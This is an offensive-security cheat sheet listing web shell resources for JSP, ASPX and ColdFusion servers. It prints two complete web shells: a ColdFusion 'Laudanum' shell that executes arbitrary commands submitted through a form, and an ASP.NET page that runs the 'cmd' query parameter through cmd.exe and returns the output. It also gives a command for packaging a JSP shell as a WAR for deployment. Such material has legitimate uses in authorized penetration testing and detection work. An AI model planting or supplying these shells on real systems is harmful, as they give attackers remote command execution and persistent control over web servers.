# Web Shells

#### JSP

* Use `usr/share/seclists/Web-Shells/FuzzDB/cmd.jsp`
* Create a WAR: `jar -cvf cmd.war cmd.jsp`
* [https://github.com/SecurityRiskAdvisors/cmd.jsp](https://github.com/SecurityRiskAdvisors/cmd.jsp)

#### ASPX

* [https://github.com/NetSPI/cmdsql](https://github.com/NetSPI/cmdsql)
* CFM (ColdFusion Markup Language) web shell
  * [https://nets.ec/Coldfusion\\\_hacking](https://nets.ec/Coldfusion/\_hacking)

```html
<cfapplication scriptProtect="none">
<cfset QuoteMark = "'" />
<cfset DoubleQuoteMark = """" />
<html>
    <head><title>Laudanum Coldfusion Shell</title></head>
    <body>
    <form action="<cfoutput>#cgi.script_name#</cfoutput>" method="POST">
        <cfif IsDefined("form.cmd")>
        Executable: <Input type="text" name="cmd" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"> For Windows use: cmd.exe or the full path to cmd.exe<br>
        Arguments: <Input type="text" name="arguments" value="<cfoutput>#HTMLEditFormat(form.arguments)#</cfoutput>"> For Windows use: /c <i>command</i><br>
        <cfelse>
        Executable: <Input type="text" name="cmd" value="cmd.exe"><br>
        Arguments: <Input type="text" name="arguments" value="/c "><br>
        </cfif>

        <input type="submit">
    </form>
<cfif IsDefined("form.cmd")>
    <cfset argumentsArray = #listToArray(form.arguments, " ")# />

    <pre>
    <cfexecute name="#Replace(preservesinglequotes(form.cmd), QuoteMark, DoubleQuoteMark, 'All')#" arguments="#argumentsArray#" timeout="5" variable="foo"></cfexecute>
    <cfoutput>#Replace(foo, "<", "&lt;", "All")#</cfoutput>
    </pre>
</cfif>
    </body>
</html>

```

* ASP

```aspnet
    <%@Import Namespace="System.Diagnostics" %>
    <%@Import Namespace="System.IO" %>

    <%
    string cmd = Request.QueryString["cmd"];
    string result = "";
    if (String.IsNullOrEmpty(cmd)) {
        result = "No parameter 'cmd' has been provided";
    } else {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        StreamReader stmrdr = p.StandardOutput;
        result = stmrdr.ReadToEnd();
        stmrdr.Close();
    }
    %>

    <%= "<textarea cols='500' rows='200' readonly>" + result + "</textarea>" %>
```
